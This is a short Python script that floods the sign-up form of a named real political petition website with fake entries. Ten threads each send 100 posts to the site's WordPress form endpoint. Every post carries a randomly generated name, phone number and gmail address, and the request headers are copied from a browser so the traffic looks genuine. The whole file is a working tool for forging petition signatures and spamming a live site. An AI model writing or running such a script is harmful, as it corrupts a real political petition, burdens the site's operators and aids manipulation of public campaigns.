import random
import string
from threading import Thread, RLock

import requests

def generate_random_string(length):
    # characters = string.ascii_letters + string.digits
    characters = string.ascii_letters
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

headers = {
    'authority': 'mehdal23.co.il',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarypaZPtY8mOfGFPcIB',
    'origin': 'https://mehdal23.co.il',
    'referer': 'https://mehdal23.co.il/',
    'sec-ch-ua': '"Chromium";v="118", "Microsoft Edge";v="118", "Not=A?Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.76',
    'x-requested-with': 'XMLHttpRequest',
}

locker = RLock()
counter = 0

def count_up():
    global counter
    with locker:
        counter += 1

def send_func():
    rnd = random.Random()
    for a in range(100):
        p = rnd.randint(1111111, 9999999)
        the_phone = '050' + str(p)
        the_username = generate_random_string(7) + ' ' + generate_random_string(8)
        the_email = the_username + '@gmail.com'

        data = f'------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n240\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n43cd415\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="referer_title"\r\n\r\nנתניהו אשם במחדל 23. תתפטר!\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="queried_id"\r\n\r\n11\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="form_fields[name]"\r\n\r\n{the_username}\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="form_fields[field_cc68a8f]"\r\n\r\n{the_phone}\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="form_fields[email]"\r\n\r\n{the_email}\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="action"\r\n\r\nelementor_pro_forms_send_form\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB\r\nContent-Disposition: form-data; name="referrer"\r\n\r\nhttps://mehdal23.co.il/\r\n------WebKitFormBoundarypaZPtY8mOfGFPcIB--\r\n'.encode()

        response = requests.post('https://mehdal23.co.il/wp-admin/admin-ajax.php', headers=headers, data=data)
        count_up()
        print(counter, the_username, the_phone, the_email)
        print(response)

for a in range(10):
    t = Thread(target=send_func, daemon=True)
    t.start()

input('enter to exit')
